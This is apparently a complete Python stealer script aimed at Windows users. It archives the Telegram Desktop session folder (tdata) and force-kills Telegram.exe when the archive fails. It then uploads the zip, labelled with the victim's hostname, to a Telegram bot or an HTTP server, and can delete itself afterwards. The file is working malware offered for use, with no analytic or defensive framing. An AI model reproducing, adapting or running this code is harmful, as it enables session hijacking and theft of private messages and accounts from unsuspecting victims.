import requests
import datetime
import subprocess
import socket
import shutil
import time
import wmi
import os

date = str(datetime.datetime.now()).replace(':', '-') # Date now (For file name)

send_by = 'tg' # Send file by telegram bot !!!WARNING!!! Telegram allows sending files < 50 MB
#send_by = 'rest' # Send file by rest request

sever_url = 'http://localhost:3000' # Server url (for send by rest request)
bot_token = '<TOKEN>' # Telegram Bot token (for send by telegram)
tg_chats_ids = [0] # Chat id to send file

directory_to_steal = f'C:\\Users\\User\\AppData\\Roaming\\Telegram Desktop\\tdata' # Directory to steal
temp_file = f'C:\\Users\\User\\AppData\\Roaming\\Telegram Desktop\\{date}' # Temp file for directory archive
self_remove = False # Remove stealler file after send stealed data


telegram_url= f"https://api.telegram.org/bot{bot_token}/senddocument?chat_id="


def main():
    try:
        shutil.make_archive(temp_file, 'zip', directory_to_steal)
    except:
        f = wmi.WMI()
        for process in f.Win32_Process(name = 'Telegram.exe'):
            print(process.ProcessId)
            subprocess.check_output("Taskkill /PID %d /F" % process.ProcessId)
            main()
    fileobj = open(f'{temp_file}.zip', 'rb')

    if send_by == 'tg':
        send_by_telegram(fileobj )
    elif send_by == 'rest':
        send_by_restapi(fileobj)


def send_by_restapi(fileobj):
    try:
        response = requests.post(sever_url, files={"archive": (f'{socket.gethostname()}-{date}.zip', fileobj)})
        if response.status_code != 200:
            raise Exception('error')
        else:
            fileobj.close()
            raise Exception('success')
    except Exception as e:
        if str(e) == 'error':
            time.sleep(3)
            main()
        elif str(e) == 'success':
            rm_tmp_file()
            if self_remove:
                os.remove(__file__)
            exit()

def send_by_telegram(file):
    for id in tg_chats_ids:
        files={'document':file}
        requests.post(telegram_url + str(id), files=files, verify=False)

        file.close()
        rm_tmp_file()
        if self_remove:
            os.remove(__file__)

def rm_tmp_file():
    try:
        os.remove(f'{temp_file}.zip')
    except:
        time.sleep(1)
        rm_tmp_file()


if __name__ == "__main__":
    main()